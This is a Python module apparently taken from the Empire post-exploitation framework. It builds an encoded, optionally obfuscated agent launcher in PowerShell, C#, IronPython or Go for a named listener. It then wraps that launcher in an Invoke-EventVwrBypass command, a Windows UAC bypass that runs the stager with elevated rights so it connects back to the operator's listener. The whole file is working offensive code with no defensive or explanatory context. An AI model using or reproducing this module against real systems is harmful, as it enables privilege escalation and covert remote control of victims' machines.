from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        listener_name = params["Listener"]
        language = params.get("Language", "powershell")
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        obf = params["Obfuscate"].lower() == "true"
        obf_cmd = params["ObfuscateCommand"]
        bypasses = params["Bypasses"]

        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            raise ModuleValidationException("Invalid listener: " + listener_name)

        lang = language.lower()

        if lang == "powershell":
            launcher = main_menu.stagergenv2.generate_launcher(
                listener_name=listener_name,
                language="powershell",
                encode=True,
                obfuscate=obf,
                obfuscation_command=obf_cmd,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                bypasses=bypasses,
            )
        elif lang in ("csharp", "ironpython"):
            launcher = main_menu.stagergenv2.generate_exe_oneliner(
                language=lang,
                obfuscate=obf,
                obfuscation_command=obf_cmd,
                encode=True,
                listener_name=listener_name,
            )
        elif lang == "go":
            launcher = main_menu.stagergenv2.generate_go_exe_oneliner(
                language=lang,
                obfuscate=obf,
                obfuscation_command=obf_cmd,
                encode=True,
                listener_name=listener_name,
            )
        else:
            raise ModuleValidationException(f"Language '{language}' not supported.")

        if not launcher:
            raise ModuleValidationException("Error in launcher generation.")

        enc_script = launcher.split(" ")[-1]
        script_end = f'Invoke-EventVwrBypass -Command "{enc_script}"'

        return script, script_end
